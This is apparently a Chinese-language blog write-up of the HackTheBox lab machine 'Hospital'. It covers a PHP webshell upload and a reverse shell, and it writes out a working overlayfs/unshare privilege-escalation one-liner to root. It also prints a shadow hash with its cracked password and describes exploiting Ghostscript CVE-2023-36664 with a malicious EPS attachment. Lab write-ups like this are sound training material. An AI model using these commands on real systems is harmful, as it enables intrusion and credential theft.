    <title>Hackthebox - S3 - Hospital</title>
    <link href="https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/"/>
    <id>https://yutianqaq.github.io/2023/11/23/Hackthebox-S3-Hospital/</id>
    <published>2023-11-23T06:43:14.000Z</published>
    <updated>2023-11-23T08:12:19.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><h2 id="Port-Scan"><a href="#Port-Scan" class="headerlink" title="Port Scan"></a>Port Scan</h2><p>通过 rustscan 扫描，得到以下开放端口</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Open 10.10.11.241:22</span><br><span class="line">Open 10.10.11.241:53</span><br><span class="line">Open 10.10.11.241:88</span><br><span class="line">Open 10.10.11.241:135</span><br><span class="line">Open 10.10.11.241:139</span><br><span class="line">Open 10.10.11.241:389</span><br><span class="line">Open 10.10.11.241:443</span><br><span class="line">Open 10.10.11.241:445</span><br><span class="line">Open 10.10.11.241:464</span><br><span class="line">Open 10.10.11.241:593</span><br><span class="line">Open 10.10.11.241:636</span><br><span class="line">Open 10.10.11.241:1801</span><br><span class="line">Open 10.10.11.241:2105</span><br><span class="line">Open 10.10.11.241:2103</span><br><span class="line">Open 10.10.11.241:2107</span><br><span class="line">Open 10.10.11.241:2179</span><br><span class="line">Open 10.10.11.241:3269</span><br><span class="line">Open 10.10.11.241:3268</span><br><span class="line">Open 10.10.11.241:3389</span><br><span class="line">Open 10.10.11.241:5985</span><br><span class="line">Open 10.10.11.241:6404</span><br><span class="line">Open 10.10.11.241:6409</span><br><span class="line">Open 10.10.11.241:6406</span><br><span class="line">Open 10.10.11.241:6407</span><br><span class="line">Open 10.10.11.241:6613</span><br><span class="line">Open 10.10.11.241:6622</span><br><span class="line">Open 10.10.11.241:6636</span><br><span class="line">Open 10.10.11.241:8080</span><br><span class="line">Open 10.10.11.241:9389</span><br></pre></td></tr></table></figure><p>对于以上结果，445 端口得到有效内容，只能从 web 端口获取信息</p><h2 id="443"><a href="#443" class="headerlink" title="443"></a>443</h2><p>一个邮箱登录页面，没有账号，无法获得更多信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="assets/f153dc16b8f6e2be1d77a4491b04e0fe.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>在 8080 端口得到一个注册页面，<a href="http://10.10.11.241:8080/register.php" target="_blank" rel="noopener">http://10.10.11.241:8080/register.php</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="assets/5fc8102245bd275b7aba2a716c85de70.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注册账号后的页面只有一个上传接口，网站是使用 php 写的，所以写一个木马来测试命令执行。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="assets/7c6203f5743b214185d16756110aaf1e.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="assets/b04d92fc7e8628302390819e4bf4cc08.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上传后，这里是无法执行执行命令，因为禁用了一些危险函数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="assets/767cc0fb766ab46f2b99ac3dca9fe2bb.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里尝试用蚁剑的插件来绕过，但上传后发现可以直接执行，由于不是独享实例，可能别人做过了这个步骤。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="assets/674c227022995f59538303d7c323910f.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h1 id="www-data"><a href="#www-data" class="headerlink" title="www-data"></a>www-data</h1><p>反弹一个 shell 来操作</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="assets/2f0c5abb885b27000dd6bc8ec84ecb8c.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@webserver:/tmp/yt$ </span><br><span class="line">unshare -rm sh -c <span class="string">"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*"</span></span><br><span class="line"></span><br><span class="line">www-data@webserver:/tmp/yt$ u/python3 -c <span class="string">'import os;os.setuid(0);os.system("bash")'</span></span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>得到 drwilliams 用户的哈希</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwilliams:<span class="variable">$6</span><span class="variable">$uWBSeTcoXXTBRkiL</span><span class="variable">$S9ipksJfiZuO4bFI6I9w</span>/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::</span><br></pre></td></tr></table></figure><p>john 破解哈希</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/S3/Hospital]</span><br><span class="line">└─$ cat <span class="built_in">hash</span>                 </span><br><span class="line">drwilliams:<span class="variable">$6</span><span class="variable">$uWBSeTcoXXTBRkiL</span><span class="variable">$S9ipksJfiZuO4bFI6I9w</span>/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::</span><br><span class="line"></span><br><span class="line">                                                                                                                                                                   </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/S3/Hospital]</span><br><span class="line">└─$ john -w=/home/kali/Desktop/rockyou.txt <span class="built_in">hash</span> </span><br><span class="line">Created directory: /home/kali/.john</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (sha512crypt, crypt(3) <span class="variable">$6</span>$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Cost 1 (iteration count) is 5000 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">qwe123!@<span class="comment">#        (drwilliams)</span></span><br></pre></td></tr></table></figure><p>drwilliams:qwe123!@#</p><p>使用此凭据可以用来登录邮件服务</p><p><a href="https://10.129.160.69/?_task=mail&_mbox=INBOX" target="_blank" rel="noopener">https://10.129.160.69/?_task=mail&amp;_mbox=INBOX</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="assets/2c8b390d78cbe28e9568759850c62f34.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p><a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection" target="_blank" rel="noopener">https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection</a></p><p>使用<a href="https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58" target="_blank" rel="noopener">脚本</a>生成base64 编码的 payload</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE_2023_36664_exploit.py -g -p <span class="string">"payload"</span> -x eps</span><br></pre></td></tr></table></figure><p>接着开启监听，回复邮件，将生成的 eps 文件上传到附件</p><p>在通过 eps 得到 shell 后，查看当前目录下的 bat 文件得到密码，使用 rdp 连接后得到 Administrator 密码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="assets/e6d9a8f26167c361d4c0e170f633cc4d.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="assets/c8e64c441fe7bb126cfb9f25a929a25e.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    
      
      
